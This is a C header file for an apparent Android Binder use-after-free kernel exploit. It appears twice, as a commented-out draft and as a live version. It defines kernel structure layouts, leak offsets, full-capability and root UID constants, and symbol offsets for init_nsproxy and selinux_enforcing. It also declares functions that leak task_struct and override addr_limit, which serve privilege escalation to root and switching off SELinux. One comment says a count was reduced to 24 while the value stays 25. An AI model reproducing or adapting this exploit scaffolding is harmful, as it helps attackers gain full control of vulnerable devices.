// #ifndef BINDER_UAF_H
// #define BINDER_UAF_H

// #include "../include/binder.h"
// #include <stdint.h>
// #include <sys/types.h>

// // #define TASK_STRUCT_OFFSET_IN_LEAKED_DATA 0xE8
// // #define OFFSET_TASK_STRUCT_ADDR_LIMIT 0xA18

// // --- CORRECTED OFFSETS FOR x86_64 ---
// #define TASK_STRUCT_OFFSET_IN_LEAKED_DATA 0xF0   // 0x190 (task) - 0xA0
// (wait) = 0xF0 #define OFFSET_TASK_STRUCT_PID 0x4E8             // Verified
// via GDB #define OFFSET_TASK_STRUCT_ADDR_LIMIT 0xA18      // Verified via GDB
// #define PAGE_SIZE 4096

// #define GLOBAL_ROOT_UID (uint32_t)0
// #define GLOBAL_ROOT_GID (uint32_t)0
// #define SECUREBITS_DEFAULT (uint32_t)0x00000000
// #define CAP_EMPTY_SET (uint64_t)0
// #define CAP_FULL_SET (uint64_t)0x3FFFFFFFFF

// #define SYMBOL_OFFSET_init_nsproxy      (ptrdiff_t)0x1233ac0
// #define SYMBOL_OFFSET_selinux_enforcing (ptrdiff_t)0x14acfe8

// #define IOVEC_COUNT 25
// #define IOVEC_WQ_INDEX 10

// struct binder_thread {
//   uint8_t proc[8];                 /* 0x000  0x08 */
//   uint8_t rb_node[24];             /* 0x008  0x18 */
//   uint8_t waiting_thread_node[16]; /* 0x020  0x10 */
//   uint8_t pid[4];                  /* 0x030  0x04 */
//   uint8_t looper[4];               /* 0x034  0x04 */
//   uint8_t looper_need_return[1];   /* 0x038  0x01 */
//   uint8_t pad0[7];                 /* 0x039  0x07 */
//   uint8_t transaction_stack[8];    /* 0x040  0x08 */
//   uint8_t todo[16];                /* 0x048  0x10 */
//   uint8_t process_todo[1];         /* 0x058  0x01 */
//   uint8_t pad1[7];                 /* 0x059  0x07 */
//   uint8_t return_error[32];        /* 0x060  0x20 */
//   uint8_t reply_error[32];         /* 0x080  0x20 */
//   uint8_t wait[24];                /* 0x0A0  0x18 */
//   uint8_t stats[204];              /* 0x0B8  0xCC */
//   uint8_t tmp_ref[4];              /* 0x184  0x04 */
//   uint8_t is_dead[1];              /* 0x188  0x01 */
//   uint8_t pad2[7];                 /* 0x189  0x07 */
//   uint8_t task[8];                 /* 0x190  0x08 */
// } __attribute__((packed));

// struct task_struct {
//   uint8_t junk1[1256];     /*     0  0x4e8 */
//   pid_t pid;               /* 0x4e8    0x4 */
//   uint8_t junk2[412];      /* 0x4ec  0x19c */
//   uint64_t cred;           /* 0x688    0x8 */
//   uint8_t junk3[48];       /* 0x690   0x30 */
//   uint64_t nsproxy;        /* 0x6c0    0x8 */
//   uint8_t junk4[1944];     /* 0x6c8  0x798 */
// } __attribute__((packed)); /* size:  0xe60 */

// struct cred {
//   int32_t usage;            /*    0    0x4 */
//   uint32_t uid;             /*  0x4    0x4 */
//   uint32_t gid;             /*  0x8    0x4 */
//   uint32_t suid;            /*  0xc    0x4 */
//   uint32_t sgid;            /* 0x10    0x4 */
//   uint32_t euid;            /* 0x14    0x4 */
//   uint32_t egid;            /* 0x18    0x4 */
//   uint32_t fsuid;           /* 0x1c    0x4 */
//   uint32_t fsgid;           /* 0x20    0x4 */
//   uint32_t securebits;      /* 0x24    0x4 */
//   uint64_t cap_inheritable; /* 0x28    0x8 */
//   uint64_t cap_permitted;   /* 0x30    0x8 */
//   uint64_t cap_effective;   /* 0x38    0x8 */
//   uint64_t cap_bset;        /* 0x40    0x8 */
//   uint64_t cap_ambient;     /* 0x48    0x8 */
//   uint8_t junk2[40];        /* 0x50   0x28 */
//   void *security;           /* 0x78    0x8 */
//   uint8_t junk3[40];        /* 0x80   0x28 */
// } __attribute__((packed));  /* size:  0xA8 */

// void binder_uaf_leak_task_struct(int binder_fd,
//                                  struct task_struct **leak_task_struct,
//                                  void **leak_pid_address,
//                                  void **leak_cred_address,
//                                  void **leak_nsproxy_address,
//                                  void **mapped_memory);

// void override_addr_limit(int binder_fd, struct task_struct
// *leak_task_struct);

// #endif

#ifndef BINDER_UAF_H
#define BINDER_UAF_H

#include "../include/binder.h"
#include <stdint.h>
#include <sys/types.h>

// --- CORRECTED OFFSETS FOR x86_64 ---
// Leak Source: wait.head (0xA8)
// Leak Target: task (0x190)
// Offset: 0x190 - 0xA8 = 0xE8
#define TASK_STRUCT_OFFSET_IN_LEAKED_DATA 0xE8
#define OFFSET_TASK_STRUCT_PID 0x4E8
#define OFFSET_TASK_STRUCT_ADDR_LIMIT 0xA18
// ------------------------------------

#define PAGE_SIZE 4096

#define GLOBAL_ROOT_UID (uint32_t)0
#define GLOBAL_ROOT_GID (uint32_t)0
#define SECUREBITS_DEFAULT (uint32_t)0x00000000
#define CAP_EMPTY_SET (uint64_t)0
#define CAP_FULL_SET (uint64_t)0x3FFFFFFFFF

#define SYMBOL_OFFSET_init_nsproxy (ptrdiff_t)0x1233ac0
#define SYMBOL_OFFSET_selinux_enforcing (ptrdiff_t)0x14acfe8

// Reduced to 24 to ensure we don't accidentally overwrite 'task' at offset 400
#define IOVEC_COUNT 25
#define IOVEC_WQ_INDEX 10

struct binder_thread {
  uint8_t proc[8];                 /* 0x000  0x08 */
  uint8_t rb_node[24];             /* 0x008  0x18 */
  uint8_t waiting_thread_node[16]; /* 0x020  0x10 */
  uint8_t pid[4];                  /* 0x030  0x04 */
  uint8_t looper[4];               /* 0x034  0x04 */
  uint8_t looper_need_return[1];   /* 0x038  0x01 */
  uint8_t pad0[7];                 /* 0x039  0x07 */
  uint8_t transaction_stack[8];    /* 0x040  0x08 */
  uint8_t todo[16];                /* 0x048  0x10 */
  uint8_t process_todo[1];         /* 0x058  0x01 */
  uint8_t pad1[7];                 /* 0x059  0x07 */
  uint8_t return_error[32];        /* 0x060  0x20 */
  uint8_t reply_error[32];         /* 0x080  0x20 */
  uint8_t wait[24];                /* 0x0A0  0x18 */
  uint8_t stats[204];              /* 0x0B8  0xCC */
  uint8_t tmp_ref[4];              /* 0x184  0x04 */
  uint8_t is_dead[1];              /* 0x188  0x01 */
  uint8_t pad2[7];                 /* 0x189  0x07 */
  uint8_t task[8];                 /* 0x190  0x08 */
} __attribute__((packed));

struct task_struct {
  uint8_t junk1[1256];     /*     0  0x4e8 */
  pid_t pid;               /* 0x4e8    0x4 */
  uint8_t junk2[412];      /* 0x4ec  0x19c */
  uint64_t cred;           /* 0x688    0x8 */
  uint8_t junk3[48];       /* 0x690   0x30 */
  uint64_t nsproxy;        /* 0x6c0    0x8 */
  uint8_t junk4[1944];     /* 0x6c8  0x798 */
} __attribute__((packed)); /* size:  0xe60 */

struct cred {
  int32_t usage;            /*    0    0x4 */
  uint32_t uid;             /*  0x4    0x4 */
  uint32_t gid;             /*  0x8    0x4 */
  uint32_t suid;            /*  0xc    0x4 */
  uint32_t sgid;            /* 0x10    0x4 */
  uint32_t euid;            /* 0x14    0x4 */
  uint32_t egid;            /* 0x18    0x4 */
  uint32_t fsuid;           /* 0x1c    0x4 */
  uint32_t fsgid;           /* 0x20    0x4 */
  uint32_t securebits;      /* 0x24    0x4 */
  uint64_t cap_inheritable; /* 0x28    0x8 */
  uint64_t cap_permitted;   /* 0x30    0x8 */
  uint64_t cap_effective;   /* 0x38    0x8 */
  uint64_t cap_bset;        /* 0x40    0x8 */
  uint64_t cap_ambient;     /* 0x48    0x8 */
  uint8_t junk2[40];        /* 0x50   0x28 */
  void *security;           /* 0x78    0x8 */
  uint8_t junk3[40];        /* 0x80   0x28 */
} __attribute__((packed));  /* size:  0xA8 */

void binder_uaf_leak_task_struct(int binder_fd,
                                 struct task_struct **leak_task_struct,
                                 void **leak_pid_address,
                                 void **leak_cred_address,
                                 void **leak_nsproxy_address,
                                 void **mapped_memory);

#endif